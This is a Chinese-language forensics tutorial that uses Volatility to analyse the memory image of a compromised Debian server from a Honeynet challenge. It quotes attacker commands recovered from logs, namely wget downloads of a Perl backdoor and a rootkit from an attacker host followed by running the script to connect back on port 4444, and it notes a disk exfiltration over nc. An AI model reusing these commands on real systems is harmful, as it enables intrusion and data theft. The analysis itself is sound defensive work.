> 原文链接: https://www.anquanke.com//post/id/86036 


# 【技术分享】电子取证技术之实战Volatility工具


                                阅读量   
                                **265772**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p2.ssl.qhimg.com/t01effc9a38a9f363f7.jpg)](https://p2.ssl.qhimg.com/t01effc9a38a9f363f7.jpg)**

****

作者：[**beswing**](http://bobao.360.cn/member/contribute?uid=820455891)

**预估稿费：300RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

这几天和麦香表哥一直在玩取证的事情，我也好好学习了Volatility 这个神器，一个开源的Windows，Linux，MaC，Android的内存取证分析工具，由python编写成，命令行操作，支持各种操作系统。

<br>

**Volatility 的安装**

这次讲的是在linux下的取证，所以我安装的也是linux平台下的Volatility。在[https://code.google.com/archive/p/volatility/](https://code.google.com/archive/p/volatility/) 下载源代码，或者使用我分享的源码，[http://pan.baidu.com/s/1o8JOQV4](http://pan.baidu.com/s/1o8JOQV4) 版本是2.6 linux下可以直接使用。如图：

[![](https://p4.ssl.qhimg.com/t01665887d83e93d422.png)](https://p4.ssl.qhimg.com/t01665887d83e93d422.png)

 图 （一）

另外，Kali自带了Volatility ，volatility在“应用程序”-“Kali Linux”-“数字取证中。

<br>

**Volatility的实战分析**

**了解常用命令**

从图一中，我们知道，我们可以通过 python vol.py -h查看帮助，获取常用的命令。例如

查看插件、地址空间、以及Profiles

[![](https://p2.ssl.qhimg.com/t011c3fc5df21ee3608.png)](https://p2.ssl.qhimg.com/t011c3fc5df21ee3608.png)

[![](https://p4.ssl.qhimg.com/t013536dd0297561b1d.png)](https://p4.ssl.qhimg.com/t013536dd0297561b1d.png)

**基本操作**

```
python vol.py -f [image] ‐profile=[profile][plugin]
```

加载镜像，以及加载相应的profile 加载插件。

需要特别说明的是，windows系统的profiles相当齐全，但是linux下的profile就得自己制作了，相应的制作方法，我们可以在[https://code.google.com/p/volatility/wiki/LinuxMemoryForensics](https://code.google.com/p/volatility/wiki/LinuxMemoryForensics) 看到，或者我们可以在[https://github.com/KDPryor/LinuxVolProfiles](https://github.com/KDPryor/LinuxVolProfiles](https://github.com/KDPryor/LinuxVolProfiles%5D(https://github.com/KDPryor/LinuxVolProfiles)看到相应linux发行版本，以及相应系统内核的profile。

<br>

**实战**

我们在这里即将分析的镜像是Challenge 7 of the Forensic Challenge 2011 – Forensic Analysis of a Compromised Server的题目，我们可以在[https://www.honeynet.org/challenges/2011_7_compromised_server](https://www.honeynet.org/challenges/2011_7_compromised_server) 这下载到相应的镜像文件。

**第一步 分析镜像文件**

分析镜像文件，我们可以通过挂载的方式，来确定镜像的系统的版本，我们才可以制作相应的profile，或者搜索相应的profile。

我们先挂载镜像 mount -o loop victoria-v8.sda1.img /mnt 将镜像挂载到/mnt。

切换到/mnt 目录 root@kali:~/Desktop/volatility-master# cd /mnt

[![](https://p2.ssl.qhimg.com/t01a7d4a5a1dbd0da22.png)](https://p2.ssl.qhimg.com/t01a7d4a5a1dbd0da22.png)

我们可以看到相应的系统文件。

```
cat etc/issue
```

查看系统版本

[![](https://p0.ssl.qhimg.com/t01797c0583773e1b68.png)](https://p0.ssl.qhimg.com/t01797c0583773e1b68.png)

我们可以看到，镜像系统版本是 Debian 发行版 5.0

在 var/log目录下，

```
cat dmesg
```

[![](https://p0.ssl.qhimg.com/t0101cce137b96a860e.png)](https://p0.ssl.qhimg.com/t0101cce137b96a860e.png)

我们可以获取相应的linux版本信息，如图，我们知道，系统内核版本是 2.6.26。

**PS：dmesg用来显示开机信息，kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。**

**第二步 获取相应profile**

我们有两种方法获取profile 。

第一，我们可以创建我们自己的profile。

Volatility自带一些windows系统的profile，Linux系统的Profile需要自己制作，制作的方法如下：

（实际是将module.dwarf和system.map打包成一个zip文件，接着将zip文件移动到 volatility/plugins/overlays/linux/ 中。）

Linux的Profile文件是一个zip的压缩包。

第二，我们可以利用搜索引擎或者已公开的profile，[**例如**](https://github.com/volatilityfoundation/profiles)，我们就可以看到一些已经公布的profile。

我这里使用的是第二种方法，在公开的项目中找到了 Debian 5.0的profile

[![](https://p4.ssl.qhimg.com/t0136c4025f4ebc92e2.png)](https://p4.ssl.qhimg.com/t0136c4025f4ebc92e2.png)

紧接着，我们需要将profile放入对应的位置

即放入目录 volatility/plugins/overlays/linux中。

[![](https://p4.ssl.qhimg.com/t01b769fd248f464d03.png)](https://p4.ssl.qhimg.com/t01b769fd248f464d03.png)

然后，我们可以通过python vol.py –info来查看 是否真的加载profile了。

[![](https://p0.ssl.qhimg.com/t01489230ac1293d010.png)](https://p0.ssl.qhimg.com/t01489230ac1293d010.png)

我们可以看到 profiles 中已经能看到 LinuxDebian5010x86了，这是我们压缩包的名字。

**第三步 开始分析文件**

```
python vol.py -f ./victoria-v8.memdump.img --profile=LinuxDebian5010x86 -h
```

可以看到针对linux镜像的命令，以及相应功能介绍。

[![](https://p5.ssl.qhimg.com/t01501b437c233d90f3.png)](https://p5.ssl.qhimg.com/t01501b437c233d90f3.png)

通过

```
python vol.py -f ./victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_psaux
```

我们可以查看进程。

[![](https://p4.ssl.qhimg.com/t015ff6131b0f20a981.png)](https://p4.ssl.qhimg.com/t015ff6131b0f20a981.png)

我们可以发现一个可疑的nc 连接。 连接到 192.168.56.1 端口是 8888

通过

```
python vol.py -f ./victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_netstat
```

我们可以查看各种网络相关信息,如网络连接,路由表,接口状态 等。

[![](https://p4.ssl.qhimg.com/t0152ace4de5acebb0c.png)](https://p4.ssl.qhimg.com/t0152ace4de5acebb0c.png)

我们可以看到 与 292.168.56.1相关的网络连接情况，一个是4444端口，一个是8888端口，

通过

```
python vol.py -f ./victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_bash
```

我们可以查看bash的历史记录

[![](https://p0.ssl.qhimg.com/t0178879f73b19c34c1.png)](https://p0.ssl.qhimg.com/t0178879f73b19c34c1.png)

我们看到，通过scp命令复制了 exim4目录下的所有文件，另外，我们在/mnt/var/log/exim4 目录下的Exim reject log 中看到，



```
wget http://192.168.56.1/c.pl -O /tmp/c.pl
wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000
```

两条命令，似乎从192.168.56.1下载了东西。

攻击者已经下载了两个文件c.pl和rk.tar，都在/ tmp中。

c.pl的简单分析表明，它是一个perl脚本，用于创建一个c程序，该程序编译给支持SUID的可执行文件

打开一个后门并向攻击者发送信息。

c.pl被下载，并且编译的SUID在端口4444中打开了一个到192.168.56.1的连接，如下所示：

```
wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444
```

以及，在python vol.py -f ./victoria-v8.memdump.img –profile=LinuxDebian5010x86 linux_bash，我们还看到了攻击者一个奇怪的操作。

[![](https://p3.ssl.qhimg.com/t01b049131a3dd08649.png)](https://p3.ssl.qhimg.com/t01b049131a3dd08649.png)

攻击者将 /dev/sda1整个dump下来，并通过 8888端口发送了出去。

Exim reject日志显示IP 192.168.56.101作为要发送邮件的主机：

abcde.com，owned.org和h0n3yn3t-pr0j3ct.com



```
H=(abcde.com) [192.168.56.101]
H=(0wned.org) [192.168.56.101]
H=(h0n3yn3t-pr0j3ct.com) [192.168.56.101]
```

我们在回过头去看

```
python vol.py -f ./victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_netstat
```

我们发现有两个已经关闭的连接。



```
TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065
TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065
```

这基本也显示了，192.168.56.101也是一个攻击IP。

我们之后通过上面的信息，知道攻击者是通过 Exim 成功攻击了这台服务器。通过搜索exim相关的漏洞我们基本可以确定 攻击是 CVE-2010-4344

此外，我们知道攻击者成功攻击了此台服务器，但是我们从

```
cat /mnt/var/log/auth.log |grep Failed
```

中看到

攻击者一直尝试以Ulysses的账户名登录，却没登录成功。

[![](https://p5.ssl.qhimg.com/t01a5cfa6fe969e5687.png)](https://p5.ssl.qhimg.com/t01a5cfa6fe969e5687.png)

<br>

**总结**

攻击者可能只是一个脚本小子，利用已有的cve 公布了的exp 进入到了系统并没有成功登录账户其次 通过分析，我们可以知道攻击的发起 以及结束 并且我们了解到攻击者简单尝试了登录账户32次后就放弃了。

<br>

**后记**

虽然是很简短的一次分析，但是，我们也可以通过这次实践，了解到Volatility的魅力，以及取证的趣味~
